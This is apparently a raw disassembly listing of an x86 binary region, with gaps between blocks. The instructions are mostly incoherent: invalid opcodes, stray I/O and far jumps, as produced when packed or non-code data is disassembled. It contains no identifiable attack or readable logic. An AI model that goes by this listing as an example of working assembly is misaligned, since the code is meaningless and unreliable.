  42405d:	add    BYTE PTR [eax],al
  42405f:	mov    bh,0x5a
  424061:	sbb    DWORD PTR [edx+eiz*8+0x46],edi
  424065:	add    edi,eax
  424067:	xchg   DWORD PTR [eax-0x26],edx
  42406a:	div    DWORD PTR [eax]
  42406c:	cmp    BYTE PTR ds:0xacd525c0,al
  424072:	and    eax,0xbf8391c6
  424077:	es push ebp
  424079:	add    eax,0xd9e5d33d
  42407e:	nop
  42407f:	or     eax,DWORD PTR [ecx+edx*4+0x1e34dfc8]
  424086:	imul   edx,edx,0x61
  424089:	mov    ah,ch
  42408b:	pusha  
  42408c:	sub    eax,0x823ed83c
  424091:	pop    ebx
  424092:	cmp    BYTE PTR [ebx+0x586e087b],ch
  424098:	push   eax
  424099:	push   esp
  42409a:	sbb    ecx,ebp
  42409c:	pop    ebx
  42409d:	inc    ebp
  42409e:	cmp    DWORD PTR [edi-0x4159d8af],esp
  4240a4:	mov    ds:0x1f36244e,al
  4240a9:	dec    edi
  4240aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240ab:	sub    al,0xe2
  4240ad:	lods   eax,DWORD PTR ds:[esi]
  4240ae:	out    0xcd,al
  4240b0:	add    ebp,DWORD PTR [esp+edi*2-0x66cd45a0]
  4240b7:	icebp  
  4240b8:	cld    
  4240b9:	mov    ch,0xf3
  4240bb:	adc    DWORD PTR [ecx-0x46],eax
  4240be:	pop    esi
  4240bf:	xchg   esi,eax
  4240c0:	mov    cl,0xe8
  4240c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240c3:	f2xm1  
  4240c5:	inc    cx
  4240c7:	ss retf 0x123
  4240cb:	xchg   esp,eax
  4240cc:	retf   0x668a
  4240cf:	xor    ch,BYTE PTR [ebx+edi*1+0x174029d0]
  4240d6:	lock lea esp,[eax-0x2b0ef8a9]
  4240dd:	dec    esi
  4240de:	mov    bl,0xeb
  4240e0:	pop    ebx
  4240e1:	loopne 0x42407b
  4240e3:	dec    ebx
  4240e4:	cmp    al,0xa
  4240e6:	mov    cl,BYTE PTR [ebx+0x1]
  4240e9:	add    eax,0xe5969473
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	push   edx
  424163:	jb     0x4241d5
  424165:	pop    es
  424166:	add    DWORD PTR [bx+di],0x0
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	add    eax,0xc9ecd758
  424173:	mov    al,0x35
  424175:	in     eax,dx
  424176:	into   
  424177:	fmul   st,st(3)
  424179:	in     eax,dx
  42417a:	jo     0x424146
  42417c:	jno    0x4241b4
  42417e:	sahf   
  42417f:	mov    al,ds:0xf33f3752
  424184:	sar    DWORD PTR [edi+esi*1-0xbc5c1cf],0xb3
  42418c:	out    dx,al
  42418d:	jo     0x424174
  42418f:	xchg   edx,eax
  424190:	ja     0x424149
  424192:	in     eax,dx
  424193:	mov    bl,BYTE PTR [ebx]
  424195:	js     0x424179
  424197:	cdq    
  424198:	push   eax
  424199:	lds    ebp,FWORD PTR [ecx-0x7e]
  42419c:	pop    eax
  42419d:	xchg   edi,eax
  42419e:	add    al,0xc5
  4241a0:	jp     0x4241d9
  4241a2:	pop    esp
  4241a3:	sub    dh,ah
  4241a5:	pop    esp
  4241a6:	or     DWORD PTR [edx-0x65],ebx
  4241a9:	idiv   edx
  4241ab:	sub    BYTE PTR [edi],ah
  4241ad:	dec    edi
  4241ae:	dec    ebx
  4241af:	push   edi
  4241b0:	pop    ecx
  4241b1:	mov    eax,0xd353a6c4
  4241b6:	add    dh,BYTE PTR [esi]
  4241b8:	(bad)  
  4241b9:	pop    edx
  4241ba:	int    0x81
  4241bc:	adc    eax,0xecdcd7cf
  4241c1:	fwait
  4241c2:	jle    0x4241cc
  4241c4:	les    eax,FWORD PTR [edx-0x4fee9a8a]
  4241ca:	push   es
  4241cb:	add    al,ch
  4241cd:	or     BYTE PTR [edx-0x55],cl
  4241d0:	xchg   edi,esp
  4241d2:	pushf  
  4241d3:	and    eax,0xdf692dbc
  4241d8:	inc    ebx
  4241d9:	adc    BYTE PTR [ebp-0x46f20d6a],0x26
  4241e0:	jle    0x4241ba
  4241e2:	mov    cl,BYTE PTR [esi-0x4824fc1d]
  4241e8:	int    0xc5
  4241ea:	int3   
  4241eb:	push   eax
  4241ec:	loope  0x4241c1
  4241ee:	fdivr  QWORD PTR [edx]
  4241f0:	mov    eax,ds:0x68e29887
  4241f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241f6:	inc    eax
  4241f7:	jle    0x42417d
  4241f9:	and    eax,0x50a7f153
  4241fe:	mov    cl,0xcf
  424200:	loopne 0x424196
  424202:	(bad)  
  424203:	cmp    ch,BYTE PTR [esi-0x4555d893]
  424209:	xor    ch,ah
  42420b:	sbb    bl,BYTE PTR [ebx+0x3fe46b52]
  424211:	jmp    0x364a:0x5cbbd75f
  424218:	adc    eax,0xdc278568
  42421d:	add    edx,0xb554e8b9
  424223:	dec    esp
  424224:	add    eax,0xca82817a
  424229:	add    BYTE PTR [ebx-0xd],dl
  42422c:	xchg   edx,eax
  42422d:	(bad)
  424230:	push   esp
  424231:	ror    DWORD PTR [ebx+edi*4-0x26],cl
  424235:	leave  
  424236:	clc    
  424237:	sub    DWORD PTR [esi+0x7a0ffe44],ecx
  42423d:	and    edx,DWORD PTR [ebp-0x3e006c3b]
  424243:	add    bh,BYTE PTR [eax-0x45]
  424246:	fimul  DWORD PTR [ebx-0x38]
  424249:	pop    eax
  42424a:	jbe    0x42420e
  42424c:	cld    
  42424d:	jnp    0x4242b9
  42424f:	cmp    al,0xd3
  424251:	xchg   DWORD PTR [ecx+eiz*4],edi
  424254:	dec    edi
  424255:	arpl   WORD PTR [ebx],di
  424257:	adc    eax,0xa0b7d7fa
  42425c:	add    al,0x46
  42425e:	cmp    BYTE PTR [esi-0x1ecef5d5],ch
  424264:	stc    
  424265:	lea    ecx,[eax]
  424267:	jg     0x4242b3
  424269:	clc    
  42426a:	in     eax,dx
  42426b:	sbb    bl,BYTE PTR [edi+0x3b]
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	pop    ecx
  4242e3:	aaa    
  4242e4:	rcl    BYTE PTR [edi+eiz*2+0x184],0x1
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	mov    eax,0x8a6a0dd1
  4242f3:	ins    DWORD PTR es:[edi],dx
  4242f4:	jnp    0x424285
  4242f6:	hlt    
  4242f7:	add    bh,ah
  4242f9:	outs   dx,DWORD PTR ds:[esi]
  4242fa:	pop    edi
  4242fb:	mov    esp,0x38d7904e
  424300:	(bad)  
  424301:	jnp    0x4242c4
  424303:	mov    db6,ecx
  424306:	xor    dh,BYTE PTR [edi]
  424308:	inc    edx
  424309:	jecxz  0x4242fe
  42430b:	aam    0x42
  42430d:	repz jmp 0x9299a0f0
  424313:	mov    dl,0xc9
  424315:	push   ds
  424316:	test   al,0xc6
  424318:	push   cs
  424319:	test   ebx,0xf2a0705d
  42431f:	lahf   
  424320:	stos   BYTE PTR es:[edi],al
  424321:	jbe    0x424394
  424323:	fisub  WORD PTR [ebx+0x174f13f5]
  424329:	mov    ecx,0x1baed329
  42432e:	and    ebp,ebp
  424330:	sbb    BYTE PTR [ebx-0x7a5339a],ah
  424336:	push   edi
  424337:	inc    edx
  424338:	sub    edi,DWORD PTR [ecx]
  42433a:	pop    ebx
  42433b:	fnsave [ebx]
  42433d:	test   al,0x4a
  42433f:	and    eax,0xffe7bd1c
  424344:	xor    ebx,DWORD PTR fs:[edi-0x29]
  424348:	loopne 0x4243a8
  42434a:	fnstsw WORD PTR [esi]
  42434c:	stos   DWORD PTR es:[edi],eax
  42434d:	mov    al,0x97
  42434f:	sbb    al,bl
  424351:	pop    es
  424352:	in     al,dx
  424353:	js     0x42434f
  424355:	or     ecx,edx
  424357:	cmp    eax,DWORD PTR [ebx]
  424359:	push   cs
  42435a:	push   esi
  42435b:	adc    eax,0x4d4e7450
  424360:	cmc    
  424361:	adc    DWORD PTR [esi+edi*2+0x7c],eax
  424365:	xchg   DWORD PTR [edi+edx*4-0x17],eax
  424369:	mov    bh,0xc4
  42436b:	out    0x63,al
  42436d:	jecxz  0x4243d2
  42436f:	pop    es
  424370:	mov    BYTE PTR [edi+eax*4-0x1d],ch
  424374:	push   ecx
  424375:	(bad)  
  424376:	js     0x4243de
  424378:	ror    ecx,0xd1
  42437b:	sbb    ecx,DWORD PTR [esp+edx*1-0x51]
  42437f:	stc    
  424380:	push   esp
  424381:	push   0x7
  424383:	xor    ah,BYTE PTR [esi-0x1eb4895e]
  424389:	hlt    
  42438a:	pop    esp
  42438b:	data16 jle 0x42436b
  42438e:	mov    dl,0x5f
  424390:	into   
  424391:	int    0xc4
  424393:	(bad)
  424396:	je     0x4243fb
  424398:	nop
  424399:	xor    eax,0xebb5a588
  42439e:	mov    ecx,0x983256d4
  4243a3:	lds    edx,FWORD PTR [ecx+eax*8+0x546ed488]
  4243aa:	out    dx,al
  4243ab:	push   ds
  4243ac:	shl    BYTE PTR [ebx-0x71],cl
  4243af:	dec    edx
  4243b0:	xor    edi,DWORD PTR [eax]
  4243b2:	cs push ebx
  4243b4:	xchg   esp,eax
  4243b5:	dec    eax
  4243b6:	imul   edi,DWORD PTR [eax-0x20],0x4ef684d6
  4243bd:	jbe    0x424359
  4243bf:	fisubr WORD PTR [ecx-0x1a]
  4243c2:	cdq    
  4243c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243c4:	mov    eax,ds:0x9fcd31f3
  4243c9:	pop    eax
  4243ca:	xlat   BYTE PTR ds:[ebx]
  4243cb:	sahf   
  4243cc:	or     BYTE PTR [edi+0x7226760e],bh
  4243d2:	pop    edi
  4243d3:	(bad)  
  4243d4:	pop    eax
  4243d5:	sti    
  4243d6:	bound  esp,QWORD PTR [edi+0x1d5b5676]
  4243dc:	sti    
  4243dd:	dec    edx
  4243de:	frndint 
  4243e0:	cli    
  4243e1:	xchg   esp,eax
  4243e2:	mov    BYTE PTR [ebx],bh
  4243e4:	lock pop ss
  4243e6:	and    esp,ebx
  4243e8:	sbb    bl,dl
  4243ea:	(bad)  
  4243eb:	cli    
  4243ec:	mov    dl,0xa8
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424489
  424463:	xor    al,0xbd
  424465:	sbb    al,0x67
  424467:	test   DWORD PTR [ecx],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [eax-0x1dfefca7],dh
  424473:	retf   0x48a2
  424476:	stos   DWORD PTR es:[edi],eax
  424477:	xchg   ebx,eax
  424478:	sub    bh,BYTE PTR [ebx]
  42447a:	jns    0x424425
  42447c:	mov    edx,DWORD PTR [eax+0x32a3cde3]
  424482:	inc    edi
  424483:	inc    eax
  424484:	pop    ecx
  424485:	inc    ebp
  424486:	sbb    al,0x8
  424488:	aaa    
  424489:	rcl    BYTE PTR [edi+0x7d0a37dc],1
  42448f:	xchg   ecx,eax
  424490:	div    BYTE PTR [ecx+0xa]
  424493:	sub    DWORD PTR [ebx-0x48],ecx
  424496:	mov    dh,0xb1
  424498:	jge    0x424438
  42449a:	mov    ch,0xa6
  42449c:	sbb    cl,0x7e
  42449f:	imul   edi,DWORD PTR [edx],0xfffffff6
  4244a2:	scas   al,BYTE PTR es:[edi]
  4244a3:	cwde   
  4244a4:	ja     0x4244a9
  4244a6:	retf   0x5634
  4244a9:	shl    BYTE PTR [ecx+ebp*1+0x61a8a17f],1
  4244b0:	inc    ecx
  4244b1:	fldln2 
  4244b3:	shr    BYTE PTR [ebp+eiz*2-0x5a51ed94],0x22
  4244bb:	jmp    0x99b7:0xb9374438
  4244c2:	xor    ecx,DWORD PTR ds:0xedb57f66
  4244c8:	cmp    BYTE PTR [esi+0x39bcf9fb],0x77
  4244cf:	mov    bl,BYTE PTR [edi-0x7e]
  4244d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244d3:	add    edx,0xffffffb2
  4244d6:	out    dx,al
  4244d7:	inc    ecx
  4244d8:	push   0x59
  4244da:	pop    es
  4244db:	sub    DWORD PTR [edi-0x7c],0xffffffdd
  4244df:	(bad)  
  4244e0:	jge    0x42447e
  4244e2:	rol    cl,0xba
  4244e5:	shl    DWORD PTR [edx*2+0x5115f8d9],0xa6
  4244ed:	sbb    BYTE PTR [ebp+0xe],dl
  4244f0:	adc    eax,0x8b5b2e82
  4244f5:	push   0x27
  4244f7:	stos   DWORD PTR es:[edi],eax
  4244f8:	xchg   edx,eax
  4244f9:	lods   eax,DWORD PTR ds:[esi]
  4244fa:	stos   BYTE PTR es:[edi],al
  4244fb:	lods   al,BYTE PTR ds:[esi]
  4244fc:	xchg   esi,eax
  4244fd:	push   es
  4244fe:	pushf  
  4244ff:	scas   eax,DWORD PTR es:[edi]
  424500:	lock pop ss
  424502:	jne    0x4244f6
  424504:	add    eax,0x6849a87d
  424509:	inc    esp
  42450a:	cmp    al,0xc
  42450c:	in     eax,dx
  42450d:	outs   dx,BYTE PTR ds:[esi]
  42450e:	adc    ebp,ecx
  424510:	and    al,0x29
  424512:	fidiv  DWORD PTR [edi+0x2d]
  424515:	retf   
  424516:	cmp    BYTE PTR ds:0x15130ea5,bh
  42451c:	jne    0x4244a8
  42451e:	adc    dh,bh
  424520:	in     al,dx
  424521:	mov    ch,0x5e
  424523:	dec    ebp
  424524:	inc    edx
  424525:	stos   DWORD PTR es:[edi],eax
  424526:	jb     0x424556
  424528:	adc    BYTE PTR [esp+ebp*4],al
  42452b:	test   eax,0xaaf32a1b
  424530:	jne    0x4244b6
  424532:	fcom   QWORD PTR [edi+0x5c]
  424535:	push   esp
  424536:	xchg   edx,eax
  424537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424538:	cmp    al,0x68
  42453a:	test   ah,dh
  42453c:	dec    BYTE PTR [ecx+0x2dd3fde]
  424542:	test   DWORD PTR [ebx-0x9],ebx
  424545:	push   edx
  424546:	fdivr  QWORD PTR [ebp+0x4f8cf19b]
  42454c:	lea    esp,[ebx+eiz*4+0x47]
  424550:	repz loopne 0x424525
  424553:	jne    0x4245b4
  424555:	mov    esp,?
  424557:	inc    ebx
  424558:	sbb    BYTE PTR [edx],dh
  42455a:	mov    ch,0x2c
  42455c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42455d:	jp     0x4245cf
  42455f:	pusha  
  424560:	cmp    bh,BYTE PTR [ebx]
  424562:	sbb    esp,esi
  424564:	je     0x4244ff
  424566:	push   0xffffffb8
  424568:	imul   BYTE PTR [edi+0x7571672f]
	...
  4245d6:	loopne 0x424647
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x12],1
  4245e3:	push   esp
  4245e4:	mov    ds:0x186671f,al
  4245e9:	add    BYTE PTR [eax],al
  4245eb:	add    DWORD PTR [eax],eax
  4245ed:	add    cl,dl
  4245ef:	xor    ebx,DWORD PTR ds:0x95de6891
  4245f5:	jbe    0x424658
  4245f7:	rcr    BYTE PTR [eax-0x48],0x6d
  4245fb:	add    BYTE PTR [eax-0x2bd8d051],cl
  424601:	cld    
  424602:	pop    edx
  424603:	data16 mov al,cl
  424606:	jae    0x4245f8
  424608:	lea    eax,[ebx-0x224a40ea]
  42460e:	pop    esi
  42460f:	push   0xffffffce
  424611:	mov    ds:0xabe1321a,al
  424616:	sbb    DWORD PTR [edi+ebx*2+0x56],edx
  42461a:	les    esp,FWORD PTR [edx-0x23]
  42461d:	fsincos 
  42461f:	aas    
  424620:	sub    DWORD PTR [esi+edx*1-0x1c0651ef],edx
  424627:	mov    cl,0xa7
  424629:	pop    ss
  42462a:	bound  edx,QWORD PTR [edi+0x3a518590]
  424630:	sbb    eax,0x6ac37154
  424635:	pop    esp
  424636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424637:	or     eax,0x2eb4dd6a
  42463c:	mov    esi,0xc12e9321
  424641:	sti    
  424642:	(bad)  
  424643:	loope  0x4245db
  424645:	fld    DWORD PTR [ecx-0x5f]
  424648:	push   ecx
  424649:	jge    0x424633
  42464b:	mov    esi,0xaee44769
  424650:	push   cs
  424651:	xor    al,0x63
  424653:	and    ah,dl
  424655:	mov    bl,0x2
  424657:	mov    ?,ebp
  424659:	xor    ax,0x210f
  42465d:	mov    edx,0xd47b84f8
  424662:	fisttp QWORD PTR [ebx+ebx*2+0x7b]
  424666:	data16 mov es,WORD PTR [ecx+0x4e]
  42466a:	adc    al,0x39
  42466d:	or     ch,BYTE PTR [edx-0x6c]
  424670:	xchg   esp,eax
  424671:	push   0x29
  424673:	gs dec ebp
  424675:	mov    bh,0xa2
  424677:	mov    WORD PTR [ecx],?
  424679:	rcl    BYTE PTR [edi-0x70],0x80
  42467d:	mov    ch,0x10
  42467f:	dec    edi
  424680:	add    ecx,edx
  424682:	in     eax,dx
  424683:	int    0x70
  424685:	mov    BYTE PTR [edx+0x7a],dh
  424688:	ins    DWORD PTR es:[edi],dx
  424689:	ja     0x4246e2
  42468b:	and    al,0x32
  42468d:	sar    DWORD PTR [edx],cl
  42468f:	sub    DWORD PTR [edx+edx*1-0x69d7e7fb],ecx
  424696:	fsubr  DWORD PTR [ecx+0x2a]
  424699:	test   BYTE PTR [esi-0x63c854f5],0xb1
  4246a0:	pop    ss
  4246a1:	jmp    0x474b:0xe8c878be
  4246a8:	adc    al,0x5f
  4246aa:	aaa    
  4246ab:	dec    ebp
  4246ac:	dec    ebp
  4246ad:	push   edi
  4246ae:	ret    0xe8a5
  4246b1:	(bad)  
  4246b2:	sub    edx,DWORD PTR [esp+edi*4+0x2c9b24d3]
  4246b9:	xor    ah,BYTE PTR [ebx-0x3]
  4246bc:	dec    ebp
  4246bd:	cmp    eax,0x1f51d083
  4246c2:	push   cs
  4246c3:	sbb    dh,0xb4
  4246c6:	call   0x2076965d
  4246cb:	mov    ebp,0xac9464b9
  4246d0:	(bad)  
  4246d1:	popf   
  4246d2:	enter  0x96d6,0x96
  4246d6:	xchg   ebx,eax
  4246d7:	and    al,0xc7
  4246d9:	xchg   ebp,eax
  4246da:	(bad)  
  4246dc:	mov    edx,0x2df12d50
  4246e1:	mov    DWORD PTR [eiz*8-0x8675a31],ecx
  4246e8:	mov    edi,0x3edb820
  4246ed:	xor    eax,0x0
	...
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [edi+0x672993f2],bh
  424767:	xchg   DWORD PTR [ecx],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [ebp+0x48],ah
  424770:	mov    DWORD PTR [ebx-0x3cd5b209],edx
  424776:	je     0x424763
  424778:	inc    esp
  424779:	xor    cl,cl
  42477b:	fsubp  st(6),st
  42477d:	pop    eax
  42477e:	xlat   BYTE PTR ds:[ebx]
  42477f:	adc    ch,0x4b
  424782:	mov    BYTE PTR [eax],bl
  424784:	mov    ds,edx
  424786:	fcmovnu st,st(0)
  424788:	cmp    DWORD PTR [ebp+0x47],eax
  42478b:	icebp  
  42478c:	cmc    
  42478d:	adc    eax,0xcc180794
  424792:	das    
  424793:	sub    BYTE PTR [esi-0x51f0769d],al
  424799:	xor    BYTE PTR [eax-0x45618b3d],al
  42479f:	push   es
  4247a0:	or     DWORD PTR [edx-0x48],ecx
  4247a3:	sti    
  4247a4:	int3   
  4247a5:	sub    al,BYTE PTR [ecx-0x3b]
  4247a8:	fcom   st(5)
  4247aa:	mov    WORD PTR [eax-0x186e2380],?
  4247b0:	aam    0x83
  4247b2:	cmp    eax,0xa03e019e
  4247b7:	push   edx
  4247b8:	pushf  
  4247b9:	cwde   
  4247ba:	pop    ebx
  4247bb:	retf   
  4247bc:	push   cs
  4247bd:	dec    edx
  4247be:	lds    eax,FWORD PTR [ebp-0x3b109b23]
  4247c4:	cwde   
  4247c5:	ficomp DWORD PTR [ebx]
  4247c7:	cmp    eax,0x5eacf983
  4247cc:	xor    al,0x14
  4247ce:	and    DWORD PTR [esi-0x209fccaa],0xfffffff9
  4247d5:	(bad)  
  4247d6:	jle    0x424774
  4247d8:	call   0x320e:0xbe018a3b
  4247df:	(bad)  [ecx]
  4247e1:	and    bl,dh
  4247e3:	jg     0x424836
  4247e5:	ret    
  4247e6:	cmp    eax,0xa280f396
  4247eb:	jp     0x424820
  4247ed:	in     eax,dx
  4247ee:	out    dx,al
  4247ef:	xlat   BYTE PTR ds:[ebx]
  4247f0:	in     eax,0xbe
  4247f2:	mov    gs,WORD PTR [ebp+0x148dccdd]
  4247f8:	cdq    
  4247f9:	into   
  4247fa:	cld    
  4247fb:	inc    ebx
  4247fc:	adc    eax,0x752eabdc
  424801:	fsub   QWORD PTR [esi-0x1e]
  424804:	cwde   
  424805:	mov    ch,0x6
  424807:	mov    eax,ds:0xf34159ed
  42480c:	mov    al,ds:0x734a5a85
  424811:	fidivr DWORD PTR [edi+ebp*1-0x53]
  424815:	xchg   ecx,eax
  424816:	dec    esp
  424817:	sbb    dh,BYTE PTR [ebx]
  424819:	add    BYTE PTR [edi],bl
  42481b:	sbb    ebp,DWORD PTR [ebp+0x15]
  42481e:	std    
  42481f:	cvtps2pi mm1,QWORD PTR [ecx+0x38f3279d]
  424826:	adc    DWORD PTR [ecx-0x35],eax
  424829:	dec    ebp
  42482a:	(bad)  
  42482b:	aad    0xa1
  42482d:	inc    ecx
  42482e:	and    eax,0x938155dd
  424833:	fcos   
  424835:	pop    ebp
  424836:	(bad)  
  424837:	jne    0x424874
  424839:	xchg   edx,eax
  42483a:	fnsave [edx+0x1926441]
  424840:	hlt    
  424841:	sbb    eax,0xd3b70d49
  424846:	xchg   edi,eax
  424847:	mov    edx,0x842cdbe3
  42484c:	sub    DWORD PTR [edi-0x13],0xffffffb5
  424850:	xor    esi,DWORD PTR [ebp+ebx*1-0x7a]
  424854:	jg     0x4248ba
  424856:	adc    ch,BYTE PTR [edi+0x3d974ba5]
  42485c:	test   DWORD PTR [edi-0x61],ebp
  42485f:	lods   ax,WORD PTR ds:[esi]
  424861:	mov    dh,0x5b
  424863:	pop    edi
  424864:	mov    DWORD PTR [ebx],ebp
  424866:	jp     0x4248c8
  424868:	(bad)  
  424869:	loope  0x424853
  42486b:	cmp    al,0xd8
  42486d:	xchg   ebp,eax
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	cmp    dl,BYTE PTR gs:[edx+ebp*8+0x67]
  4248e7:	mov    BYTE PTR [ecx],al
  4248e9:	add    BYTE PTR [eax],al
  4248eb:	add    DWORD PTR [eax],eax
  4248ed:	add    bl,ch
  4248ef:	pop    es
  4248f0:	data16 mov bl,0x30
  4248f3:	cli    
  4248f4:	pushf  
  4248f5:	mov    bl,0x6e
  4248f7:	into   
  4248f8:	loope  0x4248a8
  4248fa:	pop    esi
  4248fb:	stc    
  4248fc:	ret    0x345e
  4248ff:	enter  0xfc23,0xc9
  424903:	mov    bl,0x92
  424905:	mov    ds:0x765f02d6,al
  42490a:	xchg   edi,eax
  42490b:	inc    ecx
  42490c:	mov    edx,0x3ccec78d
  424911:	and    BYTE PTR [edi+0x658f82c6],ah
  424917:	xchg   esp,eax
  424918:	cmp    al,0xb5
  42491a:	xchg   esp,eax
  42491b:	cld    
  42491c:	xor    dh,0xa
  42491f:	shr    BYTE PTR [eax+0xffdf96d],cl
  424925:	dec    edi
  424926:	pusha  
  424927:	pop    eax
  424928:	add    edx,ebp
  42492a:	mov    al,ds:0xf4485e4d
  42492f:	jge    0x424912
  424931:	fisttp QWORD PTR [ecx+0x2f]
  424934:	push   ebp
  424935:	sbb    BYTE PTR [eax+esi*2+0x2548d580],bh
  42493c:	jne    0x424988
  42493e:	sub    DWORD PTR [edx+0x7091d671],edx
  424944:	mov    dl,0xe3
  424946:	push   ds
  424947:	xor    eax,0xd894b8a3
  42494c:	or     eax,0x8206778c
  424951:	sub    eax,0x31119c85
  424956:	fild   DWORD PTR [ecx]
  424958:	fld    DWORD PTR [eax+0x3a]
  42495b:	loopne 0x4249b3
  42495d:	(bad)  
  42495e:	jl     0x4249ce
  424960:	push   ss
  424961:	rcr    DWORD PTR [eax-0x6ab5a705],1
  424967:	fs addr16 test eax,0x75efe77a
  42496e:	sbb    ebx,DWORD PTR [eax-0x26ee4614]
  424974:	xor    DWORD PTR [esi-0x4539521b],edx
  42497a:	or     dl,BYTE PTR ds:0xdefe1340
  424980:	(bad)  
  424981:	retf   
  424982:	cmp    al,0x2e
  424984:	leave  
  424985:	and    al,BYTE PTR [eax]
  424987:	cmp    ah,BYTE PTR [ecx+edi*8-0x44de67d6]
  42498e:	push   0x1b
  424990:	fcompp 
  424992:	icebp  
  424993:	jge    0x424961
  424995:	jmp    0xfc13:0x24085ad9
  42499c:	mov    WORD PTR [edx-0x12],?
  42499f:	daa    
  4249a0:	fisttp DWORD PTR [esp+ebp*2+0x4a70babd]
  4249a7:	jae    0x42495d
  4249a9:	and    DWORD PTR [ecx-0x2b],edi
  4249ac:	mov    esi,0x6426da6c
  4249b1:	pop    ss
  4249b2:	std    
  4249b3:	jmp    0xab09:0x4496a17a
  4249ba:	mov    al,0x3e
  4249bc:	out    dx,al
  4249bd:	bound  edx,QWORD PTR [ebp-0x2a]
  4249c0:	adc    BYTE PTR [esi+0x3ab8e646],cl
  4249c6:	test   DWORD PTR ds:0x5047c8db,ebp
  4249cc:	add    esp,edx
  4249ce:	shr    DWORD PTR ds:0x8a681dd6,0x7b
  4249d5:	or     al,0xb2
  4249d7:	or     ebp,DWORD PTR [esi+0x6]
  4249da:	dec    eax
  4249db:	jle    0x424a08
  4249dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249de:	cmp    bh,bh
  4249e0:	mov    ds:0x462c9de2,eax
  4249e5:	pop    es
  4249e6:	inc    edi
  4249e8:	ins    DWORD PTR es:[edi],dx
  4249e9:	jle    0x424a36
  4249eb:	push   edx
  4249ec:	cli    
  4249ed:	sub    DWORD PTR [eax],eax
	...
  424a53:	add    BYTE PTR [eax],al
  424a55:	add    BYTE PTR [ebx+0x18],ch
  424a58:	arpl   WORD PTR [edx+0x73],bp
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    ah,bh
  424a63:	xchg   eax,ecx
  424a65:	mov    esp,0x18967
  424a6a:	add    BYTE PTR [ecx],al
  424a6c:	add    BYTE PTR [eax],al
  424a6e:	push   ebx
  424a6f:	and    al,0x86
  424a71:	mov    eax,edi
  424a73:	xor    al,0x3e
  424a75:	outs   dx,DWORD PTR ds:[esi]
  424a76:	stc    
  424a77:	mov    bh,0x8c
  424a79:	(bad)  
  424a7a:	sub    bh,BYTE PTR [esi-0x1b417566]
  424a80:	xchg   ecx,eax
  424a81:	out    dx,al
  424a82:	mov    dh,0xb9
  424a84:	sub    edx,ebp
  424a86:	nop
  424a87:	mov    ah,BYTE PTR [edi]
  424a89:	clc    
  424a8a:	mov    eax,0xbba9ae6e
  424a8f:	mov    edi,0x92ab7c14
  424a94:	test   DWORD PTR [ecx-0x4e],0x65bd177d
  424a9b:	sbb    eax,0xbe4da79f
  424aa0:	sbb    eax,0x955905db
  424aa5:	ror    ch,0x6f
  424aa8:	mov    dl,0x1b
  424aaa:	xchg   edi,eax
  424aab:	cwde   
  424aac:	ins    DWORD PTR es:[edi],dx
  424aad:	shr    ah,0x4e
  424ab0:	inc    ebx
  424ab1:	xchg   ecx,eax
  424ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ab3:	adc    edi,eax
  424ab5:	pop    ss
  424ab6:	pop    ss
  424ab7:	stc    
  424ab8:	mov    edi,0xd244cff6
  424abd:	aad    0xb6
  424abf:	pop    es
  424ac0:	mov    eax,0x26e1b645
  424ac5:	inc    edi
  424ac6:	push   ss
  424ac7:	pop    DWORD PTR [ecx]
  424ac9:	cld    
  424aca:	jl     0x424a5a
  424acc:	push   0x75844321
  424ad1:	push   es
  424ad2:	dec    eax
  424ad3:	std    
  424ad4:	loop   0x424ad6
  424ad6:	dec    edi
  424ad7:	mov    edi,0xb8076d4d
  424adc:	adc    DWORD PTR [ebx],0x42
  424adf:	push   ss
  424ae0:	mov    ds:0xcd689c14,eax
  424ae5:	in     eax,dx
  424ae6:	cli    
  424ae7:	out    dx,al
  424ae8:	mov    edi,ds
  424aea:	xor    al,0x53
  424aec:	and    BYTE PTR [ebp+0x7],ch
  424aef:	pusha  
  424af0:	push   ebx
  424af1:	inc    esp
  424af2:	retf   
  424af3:	(bad)  
  424af4:	xor    eax,0x966f8430
  424af9:	test   ebx,esp
  424afb:	loopne 0x424aeb
  424afd:	jecxz  0x424b6d
  424aff:	pop    esi
  424b00:	cs scas al,BYTE PTR es:[edi]
  424b02:	pop    esi
  424b03:	or     ebp,ebx
  424b05:	mov    dh,0xf4
  424b07:	jle    0x424b6e
  424b09:	(bad)
